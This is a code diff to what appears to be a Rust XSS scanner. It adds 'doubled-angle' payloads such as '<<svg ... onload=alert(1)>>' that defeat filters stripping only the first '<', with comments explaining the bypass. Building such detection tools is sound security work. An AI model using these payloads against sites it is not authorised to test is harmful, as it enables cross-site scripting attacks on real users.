@@ -65,6 +65,19 @@ const POSITIONAL_PAD_SHAPES: &[&str] = &[
     "<img src=x onerror=alert(1) class={CLASS}>",
 ];
 
+/// Doubled-angle ("sub-not-gsub") filter bypass shapes — see
+/// [`sub_filter_doubled_payloads`].
+///
+/// The `class` marker leads the attribute list on purpose: a filter that
+/// entity-encodes only the *first* `>` corrupts the trailing attribute, so
+/// putting the marker first keeps the class token intact (`class=dlx…` matches
+/// the DOM-marker selector exactly) while the mangled tail lands on the handler,
+/// which still carries a `alert(1`-shaped sink for the #1118 co-survival gate.
+const SUB_FILTER_DOUBLED_SHAPES: &[&str] = &[
+    "<<svg class={CLASS} onload=alert(1)>>",
+    "<<img class={CLASS} src=x onerror=alert(1)>>",
+];
+
 /// What a parameter's server-side filter permits.
 struct FilterProfile<'a> {
     invalid: &'a [char],
@@ -547,6 +560,59 @@ pub(crate) fn positional_pad_payloads(context: &InjectionContext) -> Vec<String>
 pub(crate) fn is_positional_pad_bypass(payload: &str) -> bool {
     let digits = payload.bytes().take_while(u8::is_ascii_digit).count();
     digits >= POSITIONAL_PAD_MIN_RUN && payload.as_bytes().get(digits) == Some(&b'<')
+}
+
+/// Doubled-angle ("sub-not-gsub") filter bypass payloads.
+///
+/// A common filter class strips or entity-encodes only the *first* `<` (and
+/// sometimes the first `>`) — a `str::replace`/`sub` that fires once instead of
+/// globally. Active probing sends a lone `<`, sees it removed, and records `<`
+/// in `invalid_specials`, so [`synthesize_payloads`] and the broad catalog then
+/// drop every tag payload and the reflection is missed even though it is
+/// trivially exploitable: doubling the angle (`<<svg …>>`) lets the surviving
+/// second `<` open a real tag once the filter has spent its single pass on the
+/// first one.
+///
+/// Emitted for **every** HTML-text reflection, not gated on `invalid_specials`,
+/// for the same reason as [`positional_pad_payloads`]: a per-character probe
+/// cannot tell a global `<` strip (these payloads stay inert) from a first-only
+/// one (they fire), so there is no reliable profile signal to gate on. The cost
+/// is nil on an easily-exploitable parameter — the ordinary tag payloads run
+/// first and the DOM phase stops at the first `[V]`, so the doubled variants are
+/// only ever *sent* when every plain tag was angle-filtered, exactly the
+/// sub-filter case they exist for.
+///
+/// FP-safe by the same DOM-marker + sink co-survival verification as everything
+/// else: against a *global* `<` strip (or an entity-encode-everything filter)
+/// the doubled `<<` collapses to inert text, no tag element materializes, and
+/// nothing promotes to `[V]` — nor to `[R]`, since the reflected bytes carry no
+/// executable position. Only a genuine first-only filter yields a parsed tag
+/// carrying the marker class and a live handler.
+///
+/// Carries raw `<` / `>` deliberately, so the caller's raw-angle prune must
+/// exempt it via [`is_sub_filter_doubled_bypass`].
+pub(crate) fn sub_filter_doubled_payloads(context: &InjectionContext) -> Vec<String> {
+    // Only HTML-text reflections need a tag injection; attribute / JS / CSS
+    // contexts break out without `<`, so a sub-filter on angles never blocks
+    // them.
+    if !matches!(context, InjectionContext::Html(_)) {
+        return Vec::new();
+    }
+    let class = crate::scanning::markers::class_marker();
+    SUB_FILTER_DOUBLED_SHAPES
+        .iter()
+        .map(|shape| shape.replace("{CLASS}", class))
+        .collect()
+}
+
+/// Whether `payload` is a [`sub_filter_doubled_payloads`] doubled-angle bypass:
+/// it opens with `<<`. The raw-angle prune (which drops any payload carrying a
+/// `<`/`>` the filter reports blocked) must keep these — their whole premise is
+/// that the block is a single pass, so the second raw `<` *can* open a tag once
+/// the first is consumed. No catalog payload begins with `<<`, so the prefix
+/// cleanly identifies the shape without a sentinel shared across modules.
+pub(crate) fn is_sub_filter_doubled_bypass(payload: &str) -> bool {
+    payload.starts_with("<<")
 }
 
 #[cfg(test)]
